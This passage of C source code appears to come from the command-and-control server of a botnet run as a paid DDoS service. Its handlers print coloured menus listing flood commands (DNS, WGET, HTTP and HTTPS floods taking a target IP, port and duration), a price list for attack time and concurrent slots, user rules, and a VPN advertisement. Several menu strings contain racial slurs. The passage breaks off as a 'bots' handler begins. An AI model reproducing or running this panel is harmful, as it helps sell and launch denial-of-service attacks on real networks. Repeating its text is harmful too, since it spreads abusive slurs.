        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls9,  strlen(ls9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls10, strlen(ls10), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls11, strlen(ls11), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls12, strlen(ls12), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls13, strlen(ls13), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls14, strlen(ls14), MSG_NOSIGNAL) == -1) goto end;
    }




        if(strstr(buf, "L7") || strstr(buf, "LAYER7") || strstr(buf, "l7")) {
                                                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];   //   \e[1;35m
        char ls6  [800];   //   \e[1;36m
        char ls7  [800];   //   \e[37m
        char ls8  [800];
        char ls9  [800];
        char ls10  [800];

                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m
                 
        sprintf(ls1,  "\e[38;2;255;0;211m        ╔══\e[38;2;227;27;216m══\e[38;2;199;53;221m══\e[38;2;171;80;226m═╗\e[38;2;143;106;231m ╔\e[38;2;116;133;235m══\e[38;2;88;159;240m════════════════════════╗\r\n");
        sprintf(ls2,  "\e[38;2;255;0;211m        ║Lay\e[38;2;227;27;216mer\e[38;2;199;53;221m 7\e[38;2;171;80;226m╠═\e[38;2;143;106;231m╣O\e[38;2;116;133;235mne\e[38;2;88;159;240m Small Step For Man,   ║\r\n");
        sprintf(ls3,  "\e[38;2;255;0;211m        ╚═══╦\e[38;2;227;27;216m══\e[38;2;199;53;221m═╝\e[38;2;171;80;226m ║\e[38;2;143;106;231mOn\e[38;2;116;133;235me \e[38;2;88;159;240mGiant Leap For Mankind║\r\n");
        sprintf(ls4,  "\e[38;2;255;0;211m            ║ \e[38;2;227;27;216m  \e[38;2;199;53;221m  \e[38;2;171;80;226m╚═\e[38;2;143;106;231m╦═\e[38;2;116;133;235m══\e[38;2;88;159;240m════════════════╦════╝\r\n");
        sprintf(ls5,  "\e[38;2;255;0;211m   ╔════════╩══\e[38;2;227;27;216m══\e[38;2;199;53;221m══\e[38;2;171;80;226m═╩\e[38;2;143;106;231m══\e[38;2;116;133;235m══\e[38;2;88;159;240m════════════╗  ║     \r\n");
        sprintf(ls6,  "\e[38;2;255;0;211m   ║!* DNS [IP] \e[38;2;227;27;216m[P\e[38;2;199;53;221mOR\e[38;2;171;80;226mT]\e[38;2;143;106;231m [\e[38;2;116;133;235mTI\e[38;2;88;159;240mME]        ║  ║     \r\n");
        sprintf(ls7,  "\e[38;2;255;0;211m   ║!* WGET [IP] \e[38;2;227;27;216m[T\e[38;2;199;53;221mIM\e[38;2;171;80;226mE]\e[38;2;143;106;231m  \e[38;2;116;133;235m  \e[38;2;88;159;240m          ║  ║     \r\n");            
        sprintf(ls8,  "\e[38;2;255;0;211m   ║!* HXTP [IP] [\e[38;2;227;27;216mPO\e[38;2;199;53;221mRT\e[38;2;171;80;226m] \e[38;2;143;106;231m[T\e[38;2;116;133;235mIM\e[38;2;88;159;240mE] 1024  ║  ║     \r\n");
        sprintf(ls9,  "\e[38;2;255;0;211m   ║!* HTTPS [IP] [\e[38;2;227;27;216mPO\e[38;2;199;53;221mRT\e[38;2;171;80;226m] \e[38;2;143;106;231m[T\e[38;2;116;133;235mIM\e[38;2;88;159;240mE]      ╠══╝     \r\n");
        sprintf(ls10, "\e[38;2;255;0;211m   ╚════════════════\e[38;2;227;27;216m══\e[38;2;199;53;221m══\e[38;2;171;80;226m══\e[38;2;143;106;231m══\e[38;2;116;133;235m══\e[38;2;88;159;240m═══════╝        \r\n");
    

        if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls9,  strlen(ls9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls10,  strlen(ls10),  MSG_NOSIGNAL) == -1) goto end;
    }


    if(strstr(buf, "RULES") || strstr(buf, "RULE") || strstr(buf, "rules") || strstr(buf, "rools") || strstr(buf, "Rules") || strstr(buf, "rule")) {
                                                        send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p5  [800];
        char p6  [800];   
        char p7  [800];    //  \e[37m
        char p8  [800];
        char p9  [800];
        char p10  [800];
        char p11  [800];

                      //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

sprintf(p2,   "\e[38;2;255;0;211m           ╔╗\e[38;2;227;27;216m Y\e[38;2;199;53;221mou\e[38;2;171;80;226m Wi\e[38;2;143;106;231mll \e[38;2;116;133;235mGet\e[38;2;88;159;240m Banned Nigga ╔╗                                 \r\n");
sprintf(p3,   "\e[38;2;255;0;211m           ╠══\e[38;2;227;27;216m══\e[38;2;199;53;221m══\e[38;2;171;80;226m═══\e[38;2;143;106;231m═══\e[38;2;116;133;235m═══\e[38;2;88;159;240m══════════════╣                                 \r\n");
sprintf(p4,   "\e[38;2;255;0;211m           ║{1}\e[38;2;227;27;216m D\e[38;2;199;53;221mon\e[38;2;171;80;226m't \e[38;2;143;106;231mSpa\e[38;2;116;133;235mm A\e[38;2;88;159;240mttacks       ╠════════════╗                    \r\n");
sprintf(p5,   "\e[38;2;255;0;211m           ║{2} \e[38;2;227;27;216mDo\e[38;2;199;53;221mn'\e[38;2;171;80;226mt L\e[38;2;143;106;231meak\e[38;2;116;133;235m IP\e[38;2;88;159;240m Or Port    ╠═══════════╗║                    \r\n");
sprintf(p6,   "\e[38;2;255;0;211m           ║{3} D\e[38;2;227;27;216mon\e[38;2;199;53;221m't\e[38;2;171;80;226m Sh\e[38;2;143;106;231mare\e[38;2;116;133;235m Ya\e[38;2;88;159;240m Login     ╠═╗         ║║                    \r\n");
sprintf(p7,   "\e[38;2;255;0;211m           ║{4} Do\e[38;2;227;27;216mn'\e[38;2;199;53;221mt \e[38;2;171;80;226mAtt\e[38;2;143;106;231memp\e[38;2;116;133;235mt t\e[38;2;88;159;240mo TCP Dump║ ║   ╔═════╩╩═════╗              \r\n");
sprintf(p8,   "\e[38;2;255;0;211m           ║{5} Don\e[38;2;227;27;216m't\e[38;2;199;53;221m B\e[38;2;171;80;226muy \e[38;2;143;106;231mMor\e[38;2;116;133;235mtem\e[38;2;88;159;240m Ya Pussy║ ║   ║@kaiten.kbot║              \r\n");
sprintf(p9,   "\e[38;2;255;0;211m           ╚════════\e[38;2;227;27;216m══\e[38;2;199;53;221m══\e[38;2;171;80;226m═══\e[38;2;143;106;231m═══\e[38;2;116;133;235m═══\e[38;2;88;159;240m══════╦═╝ ╚═══╣============║              \r\n");
sprintf(p10,  "\e[38;2;255;0;211m                     \e[38;2;227;27;216m  \e[38;2;199;53;221m  \e[38;2;171;80;226m   \e[38;2;143;106;231m   \e[38;2;116;133;235m   \e[38;2;88;159;240m     ╚═══════╣@11xrvt   <3║              \r\n");
sprintf(p11,  "\e[38;2;255;0;211m                      \e[38;2;227;27;216m  \e[38;2;199;53;221m  \e[38;2;171;80;226m   \e[38;2;143;106;231m   \e[38;2;116;133;235m   \e[38;2;88;159;240m            ╚════════════╝              \r\n");
      
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p9,  strlen(p9), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p10,  strlen(p10), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p11,  strlen(p11), MSG_NOSIGNAL) == -1) goto end;
    }


            if(strstr(buf, "PRICES") || strstr(buf, "prices") || strstr(buf, "Prices") || strstr(buf, "PRICE") || strstr(buf, "prices") || strstr(buf, "price")) {
                            send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p5  [800];  // 
        char p6  [800];  // 
        char p7  [800];
        char p8  [800];  // \e[37m  \e[38;2;88;159;240m

        sprintf(p2,   "\e[38;2;255;0;211m╔═════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════════╗\r\n");
        sprintf(p3,   "\e[38;2;255;0;211m║$15.9\e[38;2;227;27;216m9 | Mo\e[38;2;199;53;221mnthly \e[38;2;171;80;226m  - 60\e[38;2;143;106;231m0 Seco\e[38;2;116;133;235mnds | 1\e[38;2;88;159;240m Concurrent ║\r\n");
        sprintf(p4,   "\e[38;2;255;0;211m║$21.9\e[38;2;227;27;216m9 | 2 \e[38;2;199;53;221mMonths\e[38;2;171;80;226m  - 75\e[38;2;143;106;231m0 Seco\e[38;2;116;133;235mnds | 1 \e[38;2;88;159;240mConcurrent ║\r\n");
        sprintf(p5,   "\e[38;2;255;0;211m║$25.9\e[38;2;227;27;216m9 | 3 \e[38;2;199;53;221mMonths\e[38;2;171;80;226m  - 90\e[38;2;143;106;231m0 Seco\e[38;2;116;133;235mnds | 2 C\e[38;2;88;159;240moncurrents║\r\n");
        sprintf(p6,   "\e[38;2;255;0;211m║$80.6\e[38;2;227;27;216m0 | Li\e[38;2;199;53;221mfetime\e[38;2;171;80;226m  -260\e[38;2;143;106;231m0 Seco\e[38;2;116;133;235mnds | 4 Co\e[38;2;88;159;240mncurrents║\r\n");
        sprintf(p7,   "\e[38;2;255;0;211m║$120 \e[38;2;227;27;216m  | Li\e[38;2;199;53;221mfetime\e[38;2;171;80;226m  -360\e[38;2;143;106;231m0 Seco\e[38;2;116;133;235mnds | 5 Con\e[38;2;88;159;240mcurrents║\r\n");
        sprintf(p8,   "\e[38;2;255;0;211m╚═════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m════════════\e[38;2;88;159;240m═══════╝\r\n");
      
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;
    }


        if(strstr(buf, "HIS") || strstr(buf, "his") || strstr(buf, "His")) {
                                                                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];
        char ls6  [800];
        char ls7  [800];
        char ls8  [800];

                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

                 
                sprintf(ls1,   "\e[38;2;227;27;216m                              K\e[38;2;227;27;216ma\e[38;2;199;53;221mi\e[38;2;171;80;226mt\e[38;2;143;106;231me\e[38;2;116;133;235mn\e[38;2;88;159;240m, Kaiten is very Sexy.\r\n");
                sprintf(ls2,   "\e[38;2;227;27;216m                              Ka\e[38;2;227;27;216mi\e[38;2;199;53;221mt\e[38;2;171;80;226me\e[38;2;143;106;231mn\e[38;2;116;133;235m \e[38;2;88;159;240mWill Always Be Sexy.\r\n");
                sprintf(ls3,   "\e[38;2;227;27;216m                              Kai\e[38;2;227;27;216mt\e[38;2;199;53;221me\e[38;2;171;80;226mn\e[38;2;143;106;231m \e[38;2;116;133;235mI\e[38;2;88;159;240ms A Female.\r\n");
                sprintf(ls4,   "\e[38;2;227;27;216m                              Kait\e[38;2;227;27;216me\e[38;2;199;53;221mn\e[38;2;171;80;226m \e[38;2;143;106;231mH\e[38;2;116;133;235ma\e[38;2;88;159;240ms Big Titties.\r\n");
                sprintf(ls5,   "\e[38;2;227;27;216m                              Kaite\e[38;2;227;27;216mn\e[38;2;199;53;221m \e[38;2;171;80;226mI\e[38;2;143;106;231ms\e[38;2;116;133;235m \e[38;2;88;159;240mNumber #1.\r\n");
                sprintf(ls6,   "\e[38;2;227;27;216m                              Kaiten\e[38;2;227;27;216m \e[38;2;199;53;221mL\e[38;2;171;80;226mo\e[38;2;143;106;231mv\e[38;2;116;133;235me\e[38;2;88;159;240ms Everyone.\r\n");                
                sprintf(ls7,   "\e[38;2;227;27;216m                              Kaiten \e[38;2;227;27;216mH\e[38;2;199;53;221ma\e[38;2;171;80;226ms\e[38;2;143;106;231m \e[38;2;116;133;235mA\e[38;2;88;159;240m Nice Ass\r\n");
                sprintf(ls8,   "\e[38;2;227;27;216m                              KAITEN L\e[38;2;227;27;216mO\e[38;2;199;53;221mV\e[38;2;171;80;226mE\e[38;2;143;106;231mS\e[38;2;116;133;235m \e[38;2;88;159;240mYOU NIGGA <3\r\n");
    

                if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
    }

            if(strstr(buf, "more") || strstr(buf, "More") || strstr(buf, "MORE")) {
                                                                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];
        char ls6  [800];

                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

sprintf(ls1,   "\e[38;2;255;0;211m ╔═════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m══════╗\r\n");
sprintf(ls2,   "\e[38;2;255;0;211m ║msg --\e[38;2;227;27;216m Sends\e[38;2;199;53;221m A Mes\e[38;2;171;80;226msage T\e[38;2;143;106;231mo Anot\e[38;2;116;133;235mher Us\e[38;2;88;159;240mer   ║ \r\n");
sprintf(ls3,   "\e[38;2;255;0;211m ║online \e[38;2;227;27;216m-- Sho\e[38;2;199;53;221mws Who\e[38;2;171;80;226m Is On\e[38;2;143;106;231mline  \e[38;2;116;133;235m      \e[38;2;88;159;240m    ║    \r\n");
sprintf(ls4,   "\e[38;2;255;0;211m ║toggle1 \e[38;2;227;27;216m-- Tur\e[38;2;199;53;221mns Inc\e[38;2;171;80;226moming \e[38;2;143;106;231mMessag\e[38;2;116;133;235mes On/\e[38;2;88;159;240mOff║      \r\n");
sprintf(ls5,   "\e[38;2;255;0;211m ║toggle2 -\e[38;2;227;27;216m- Turn\e[38;2;199;53;221ms Broa\e[38;2;171;80;226mdcasti\e[38;2;143;106;231mng On/\e[38;2;116;133;235mOff   \e[38;2;88;159;240m  ║\r\n");
sprintf(ls6,   "\e[38;2;255;0;211m ╚══════════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═╝\r\n");


                if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
    }

        if(strstr(buf, "unknown") || strstr(buf, "UNKNOWN") || strstr(buf, "Unknown")) {
              send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];
        char ls6  [800]; // \e[1;35m
        char ls7  [800]; // \e[1;36m
        char ls8  [800]; // \e[37m
        char ls9  [800];
        char ls10  [800];

                        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

                sprintf(ls1,   "\e[38;2;255;0;211m                    ╔═\e[38;2;199;53;221m══\e[38;2;171;80;226m══\e[38;2;143;106;231m══\e[38;2;116;133;235m══\e[38;2;116;133;235m══\e[38;2;88;159;240m╗       \r\n");
                sprintf(ls2,   "\e[38;2;255;0;211m ╔═\e[38;2;227;27;216m═\e[38;2;199;53;221m══\e[38;2;171;80;226m══\e[38;2;143;106;231m══\e[38;2;116;133;235m══\e[38;2;116;133;235m══\e[38;2;88;159;240m═╗    ║To Buy     ║       \r\n");
                sprintf(ls3,   "\e[38;2;255;0;211m ║ U\e[38;2;227;27;216mn\e[38;2;199;53;221mkn\e[38;2;171;80;226mow\e[38;2;143;106;231mn \e[38;2;116;133;235mVP\e[38;2;116;133;235mN \e[38;2;88;159;240m╠════╣DM         ║       \r\n");
                sprintf(ls4,   "\e[38;2;255;0;211m ╚╦══\e[38;2;227;27;216m═\e[38;2;199;53;221m══\e[38;2;171;80;226m══\e[38;2;143;106;231m══\e[38;2;116;133;235m══\e[38;2;116;133;235m═╝\e[38;2;88;159;240m    ║Komodo#2590║       \r\n");
                sprintf(ls5,   "\e[38;2;255;0;211m  ╠═══\e[38;2;227;27;216m═\e[38;2;199;53;221m═╗\e[38;2;171;80;226m  \e[38;2;143;106;231m  \e[38;2;116;133;235m  \e[38;2;116;133;235m  \e[38;2;88;159;240m   ╚═══════════╝       \r\n");
                sprintf(ls6,   "\e[38;2;255;0;211m ╔╩═╗╔═\e[38;2;227;27;216m═\e[38;2;199;53;221m╩═\e[38;2;171;80;226m══\e[38;2;143;106;231m══\e[38;2;116;133;235m══\e[38;2;116;133;235m══\e[38;2;88;159;240m═══╦══════════════╗   \r\n");
                sprintf(ls7,   "\e[38;2;255;0;211m ║<3║║$5\e[38;2;227;27;216m \e[38;2;199;53;221m -\e[38;2;171;80;226m 1\e[38;2;143;106;231m M\e[38;2;116;133;235mon\e[38;2;116;133;235mth\e[38;2;88;159;240m  ║  UnknwonVPN  ║   \r\n");
                sprintf(ls8,   "\e[38;2;255;0;211m ╚══╝║$25\e[38;2;227;27;216m \e[38;2;199;53;221m- \e[38;2;171;80;226m3 \e[38;2;143;106;231mMo\e[38;2;116;133;235mnt\e[38;2;116;133;235mhs\e[38;2;88;159;240m ║ Fast Servers ║   \r\n");
                sprintf(ls9,   "\e[38;2;255;0;211m     ║$50 \e[38;2;227;27;216m-\e[38;2;199;53;221m 6\e[38;2;171;80;226m M\e[38;2;143;106;231mon\e[38;2;116;133;235mth\e[38;2;116;133;235ms \e[38;2;88;159;240m║ 24/7 Support ║   \r\n");
                sprintf(ls10,  "\e[38;2;255;0;211m     ╚═══════════════╩═════════\e[38;2;199;53;221m══\e[38;2;171;80;226m══\e[38;2;143;106;231m═╝ \r\n");              

    

                if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls9,  strlen(ls9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls10,  strlen(ls10),  MSG_NOSIGNAL) == -1) goto end;
    }













			if (strcasestr(buf, "bots")) 
			{
        	    char synpur1[128];
        	    char synpur2[128];
        	    char synpur3[128];
        	    char synpur4[128];
        	    char synpur5[128];
        	    char synpur6[128];
        	    char synpur7[128];
        	    char synpur8[128];
	
